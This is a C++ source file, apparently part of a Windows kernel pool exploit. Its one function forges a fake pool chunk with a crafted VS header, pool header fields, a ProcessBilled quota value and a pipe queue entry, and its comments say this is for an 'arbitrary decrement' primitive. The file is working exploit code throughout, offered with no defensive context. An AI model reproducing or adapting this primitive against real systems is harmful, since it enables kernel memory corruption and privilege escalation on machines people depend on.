#include <cstdint>

#include "primitives/fake_chunk.h"

unsigned char g_counter = 0x41;

char* CreateFakeChunk(
    uintptr_t encoded_vs_header[2],
    unsigned char previous_size,
    unsigned char pool_index,
    unsigned char block_size,
    unsigned char pool_type,
    uint32_t pool_tag,
    uintptr_t process_billed,
    pipe_queue_entry_t* pipe_queue_entry)
{
    char* chunk_buf = (char*)malloc(0x1000);
    memset(chunk_buf, g_counter++, sizeof(chunk_buf));

    // set vs chunk header
    if (encoded_vs_header)
    {
        *(uint64_t*)((unsigned char*)chunk_buf) = encoded_vs_header[0];
        *(uint64_t*)((unsigned char*)chunk_buf + 8) = encoded_vs_header[1];
    }

    // Configure pool header for arbitrary decrement
    *((unsigned char*)chunk_buf + GHOST_CHUNK_OFFSET) = previous_size;  // Previous size
    *((unsigned char*)chunk_buf + GHOST_CHUNK_OFFSET + 1) = pool_index; // Pool index
    *((unsigned char*)chunk_buf + GHOST_CHUNK_OFFSET + 2) = block_size; // Block size
    *((unsigned char*)chunk_buf + GHOST_CHUNK_OFFSET + 3) = pool_type;  // Pool type

    // Set pool tag
    *(uint32_t*)((unsigned char*)chunk_buf + GHOST_CHUNK_OFFSET + 4) = pool_tag;

    // Configure quota value for arbitrary decrement
    *(uintptr_t*)((unsigned char*)chunk_buf + GHOST_CHUNK_OFFSET + 8) = process_billed;

    if (pipe_queue_entry)
    {
        memcpy(chunk_buf + GHOST_CHUNK_OFFSET + POOL_HEADER_SIZE, pipe_queue_entry, sizeof(pipe_queue_entry_t));
    }

    return chunk_buf;
}
